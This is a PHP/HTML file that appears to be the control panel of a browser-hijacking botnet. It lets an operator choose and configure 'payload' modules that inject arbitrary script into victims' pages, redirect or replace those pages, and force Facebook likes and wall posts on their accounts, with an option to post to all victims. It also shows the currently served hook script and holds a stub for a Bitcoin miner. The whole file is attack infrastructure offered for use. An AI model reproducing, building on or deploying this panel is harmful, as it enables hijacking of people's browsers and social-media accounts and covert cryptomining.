<?
// source
$source_file = "../ping/main.js";
$source_file_data = file_get_contents($source_file);


// switches
$active_module_log = parse_ini_file("../db/active_payload.php", true);
$active_module = $active_module_log['active'];
if( $active_module == "raw_source")
{ flush();
  $raw_source_ON = "selected";
  $raw_source_OFF = "";
  $page_redirect_ON = "";
  $page_redirect_OFF = "selected";
  $replace_page_ON = "";
  $replace_page_OFF = "selected";
  $like_page_facebook_ON = "";
  $like_page_facebook_OFF = "selected";
  $post_to_wall_facebook_ON = "";
  $post_to_wall_facebook_OFF = "selected";
}
if( $active_module == "page_redirect" )
{ flush();
  $raw_source_ON = "";
  $raw_source_OFF = "selected";
  $page_redirect_ON = "selected";
  $page_redirect_OFF = "";
  $replace_page_ON = "";
  $replace_page_OFF = "selected";
  $like_page_facebook_ON = "";
  $like_page_facebook_OFF = "selected";
  $post_to_wall_facebook_ON = "";
  $post_to_wall_facebook_OFF = "selected";
}
if( $active_module == "replace_page" )
{ flush();
  $raw_source_ON = "";
  $raw_source_OFF = "selected";
  $page_redirect_ON = "";
  $page_redirect_OFF = "selected";
  $replace_page_ON = "selected";
  $replace_page_OFF = "";
  $like_page_facebook_ON = "";
  $like_page_facebook_OFF = "selected";
  $post_to_wall_facebook_ON = "";
  $post_to_wall_facebook_OFF = "selected";
}
if( $active_module == "like_page_facebook" )
{ flush();
  $raw_source_ON = "";
  $raw_source_OFF = "selected";
  $page_redirect_ON = "";
  $page_redirect_OFF = "selected";
  $replace_page_ON = "";
  $replace_page_OFF = "selected";
  $like_page_facebook_ON = "selected";
  $like_page_facebook_OFF = "";
  $post_to_wall_facebook_ON = "";
  $post_to_wall_facebook_OFF = "selected";
}
if( $active_module == "post_to_wall_facebook" )
{ flush();
  $raw_source_ON = "";
  $raw_source_OFF = "selected";
  $page_redirect_ON = "";
  $page_redirect_OFF = "selected";
  $replace_page_ON = "";
  $replace_page_OFF = "selected";
  $like_page_facebook_ON = "";
  $like_page_facebook_OFF = "selected";
  $post_to_wall_facebook_ON = "selected";
  $post_to_wall_facebook_OFF = "";
}

?>
<script type="text/javascript">
/* fancy switches */
$(document).ready( function(){ 
  $(".cb-enable").click(function(){
    var parent = $(this).parents('.switch');
     $('.cb-disable',parent).removeClass('selected');
     $(this).addClass('selected');
     $('.checkbox',parent).attr('checked', true);
  });
  $(".cb-disable").click(function(){
    var parent = $(this).parents('.switch');
     $('.cb-enable',parent).removeClass('selected');
     $(this).addClass('selected');
     $('.checkbox',parent).attr('checked', false);
  });
});
</script>
<style type="text/css">
/* Used for the Switch effect: */
.cb-enable, .cb-disable, .cb-enable span, .cb-disable span
  {
    background: url(../images/switch.png) repeat-x;
    display: inline;
    float: left;
 }
.cb-enable span, .cb-disable span
  {
    line-height: 30px;
    display: inline;
    background-repeat: no-repeat;
    font-weight: bold;
 }
.cb-enable span
  {
  background-position: left -90px;
  padding: 0 10px;
 }
.cb-disable span
  {
    background-position: right -180px;
    padding: 0 10px;
 }
.cb-disable.selected 
  {
    background-position: 0 -30px; 
 }
.cb-disable.selected span 
  { 
    background-position: right -210px; 
    color: #fff;
 }
.cb-enable.selected 
  { 
    background-position: 0 -60px;
 }
.cb-enable.selected span 
  { 
    background-position: left -150px;
    color: #fff; 
 }
.switch label 
{ 
cursor: pointer; 
}
</style>


<center>
<strong>Manage Modules </strong>
<br /><br />
<link rel="stylesheet" href="http://<?php echo $_SERVER['SERVER_NAME'];?>/styles/tabcontent.css" type="text/css" media="screen" />
<script>
  // When the document loads do everything inside here ...
  $(document).ready(function(){
	// When a link is clicked
	$("a.tab").click(function () {
		// switch all tabs off
		$(".activee").removeClass("activee");
		// switch this tab on
		$(this).addClass("activee");
		// slide all content up
		$(".contentt").slideUp();
		// slide this content up
		var content_show = $(this).attr("title");
		$("#"+content_show).slideDown();
	});
  });
</script>
<div id="tabbed_box_1" class="tabbed_box">
  <div class="tabbed_area">
    <ul class="tabs">
      <li><a href="#" title="content_1" class="tab activee">Misc.</a></li>
      <li><a href="#" title="content_2" class="tab">Chat</a></li>
      <li><a href="#" title="content_3" class="tab">FaceBook</a></li>
      <li><a href="#" title="content_4" class="tab">YouTube</a></li>
      <li><a href="#" title="content_5" class="tab">Twitter</a></li>
      <li><a href="#" title="content_6" class="tab">Updates</a></li>
      <li><a href="#" title="content_7" class="tab">Other</a></li>
    </ul>
    <div id="content_1" class="contentt">
    <ul>
      
        <!-- Start Raw Input -->
        <table border="0" style="background-color: #fff;">
          <tr>
            <td>
              <b>Raw Input</b>
            </td>
            <td>
              <form name="raw_source" action="payloads/raw_source.php" method="post">
                Source:
            </td>
            <td>
              <input type="text" name="src" />
              <input type="hidden" name="pass" value="tno"/>
            </td>
            <td>
              <input type="submit" value="Submit" />
              </form>
            </td>
            <td>
              <div class="field switch">
                <label class="cb-enable <? echo $raw_source_ON; ?>"><span>On</span></label>
                <label class="cb-disable <? echo $raw_source_OFF; ?>"><span>Off</span></label>
                <input type="checkbox" id="checkbox" class="checkbox" name="field2" style="display:none" />
              </div>
            </td>
          </tr> <!-- End Raw Input -->
      <!-- Start - Page Redirect -->

<tr>
  <td>
    <b>Page Redirect</b>
  </td>
  <td>
    <form name="page_redirect" action="payloads/page_redirect.php" method="post">
      Location:
  </td>
  <td>
      <input type="text" name="loc" />
      <input type="hidden" name="pass" value="tno"/>
  </td>
  <td>
    <input type="submit" value="Submit" />
    </form>
  </td>
  <td>
    <div class="field switch">
      <label class="cb-enable <? echo $page_redirect_ON; ?>"><span>On</span></label>
      <label class="cb-disable <? echo $page_redirect_OFF; ?>"><span>Off</span></label>
      <input type="checkbox" id="checkbox" class="checkbox" name="field2" style="display:none" />
    </div>
  </td>
</tr>
<!-- End - Page Redirect -->

<!-- Start - Replace Page -->
<tr>
  <td>
    <b>Replace Page</b>
  </td>
  <td>
    <form name="replace_page" action="payloads/replace_page.php" method="post">
      Content:
  </td>
  <td>
      <input type="text" name="content" />
      <input type="hidden" name="pass" value="tno"/>
  </td>
  <td>
    <input type="submit" value="Submit" />
    </form>
  </td>
  <td>
    <div class="field switch">
      <label class="cb-enable <? echo $replace_page_ON; ?>"><span>On</span></label>
      <label class="cb-disable <? echo $replace_page_OFF; ?>"><span>Off</span></label>
      <input type="checkbox" id="checkbox" class="checkbox" name="field2" style="display:none" />
    </div>
  </td>
</tr>
<!-- End - Replace Page -->
</table>            	
            	
			</ul>
        </div>
        <div id="content_2" class="contentt">
        <ul> <!-- Chat -->
        </ul>
        </div>
        
        <div id="content_3" class="contentt">
        	<ul>
        <table border="0" style="background-color: #fff;">
<!-- Start - Like Page   -->
  <tr>
    <td>
      <img src="../images/icons/facebook.png" style="height: 100%; vertical-align: middle"/>
      <b>Like Page</b>
    </td>
    <td>
      <form name="page_like" action="payloads/like_page_facebook.php" method="post">
        Page ID:
    </td>
    <td>
        <input type="text" name="pageID" />
        <input type="hidden" name="pass" value="tno"/>
    </td>
    <td>
        <input type="submit" value="Submit" />
      </form>
    </td>
  <td>
    <div class="field switch">
      <label class="cb-enable <? echo $like_page_facebook_ON; ?>"><span>On</span></label>
      <label class="cb-disable <? echo $like_page_facebook_OFF; ?>"><span>Off</span></label>
      <input type="checkbox" id="checkbox" class="checkbox" name="field2" style="display:none" />
    </div>
  </td>
  </tr>

<!-- End - Like Page -->

<!-- Start - Wall Post-->

  <tr>
    <td>
      <img src="../images/icons/facebook.png" style="height: 100%; vertical-align: middle"/>
      <b>Post to Wall</b>
    </td>
    <td>
      <form name="post_to_wall_facebook" action="payloads/post_to_wall_facebook.php" method="post">
        Target:
    </td>
    <td>
        <input type="text" name="target" />
    </td>
    <td>
        <input type="checkbox" name="target" value="all" onClick='alert('1')'/> <small>Post to all</small>
    </td>
    <td rowspan="2">
    <div class="field switch">
      <label class="cb-enable <?echo $post_to_wall_facebook_ON; ?>"><span>On</span></label>
      <label class="cb-disable <?echo $post_to_wall_facebook_OFF; ?>"><span>Off</span></label>
      <input type="checkbox" id="checkbox" class="checkbox" name="field2" style="display:none" />
    </div>
    </td>
  </tr>
  <tr>
    <td>
    <!-- column 1 -->
    </td>
    <td>
        Post Text:
    </td>
    <td>
        <input type="text" name="postText" />
        <input type="hidden" name="pass" value="tno"/>
    </td>
  <td>
        <input type="submit" value="Submit" />
      </form>
    </td>
  </tr>
<!--  <tr>
  <td></td>
  <td></td>
    <td>
    <div class="field switch">
      <label class="cb-enable selected"><span>On</span></label>
      <label class="cb-disable"><span>Off</span></label>
      <input type="checkbox" id="checkbox" class="checkbox" name="field2" style="display:none" />
    </div>
  </td>
  </tr>-->
</table>
<!-- End - Wall Post-->
</ul>
        </div>
 
 

        <div id="content_4" class="contentt">
        <ul> 
        </ul>
        </div>
        
                <div id="content_5" class="contentt">
        <ul> 
        </ul>
        </div>
        
                <div id="content_6" class="contentt">
        <ul> 
        </ul>
        </div>
        

<div id="content_7" class="contentt">
<ul>
        <table border="0" style="background-color: #fff;">
<tr>
  <td>
    <b>Bitcoin Miner</b>
  </td>
  <td>
    <form name="" action="" method="post">
      Email:
  </td>
  <td>
      <input type="text" name="content" />
      <input type="hidden" name="pass" value="tno"/>
  </td>
  <td>
    <input type="submit" value="Submit" />
    </form>
  </td>
  <td>
    <div class="field switch">
      <label class="cb-enable <? //echo $replace_page_ON; ?>"><span>On</span></label>
      <label class="cb-disable <? //echo $replace_page_OFF; ?>"><span>Off</span></label>
      <input type="checkbox" id="checkbox" class="checkbox" name="field2" style="display:none" />
    </div>
  </td>
</tr>
</table>          
</ul>
</div>
        

    
    </div>

</div>




 
    
    
    
<!-- Start - Select User 
<table border="0" style="background-color: #fff;">
  <tr>
    <td>
      <b>Select User(s)</b>
    </td>
    <td>
      ID:
    </td>
    <td>
<?
//include("modules_content_user_select.php");
flush();
?>
    </td>
      <td>

    </form>
  </td>
  <td>
  </td>
  </tr>
 End - Select User -->



<!-- Start view current source -->
<br />
<a href="../ping/" style="text-decoration:none"><b>Current Source:</b><a/>
<br />
<textarea rows="5" cols="50" readonly="readonly">
<?
echo $source_file_data;
?>
</textarea>
</center>
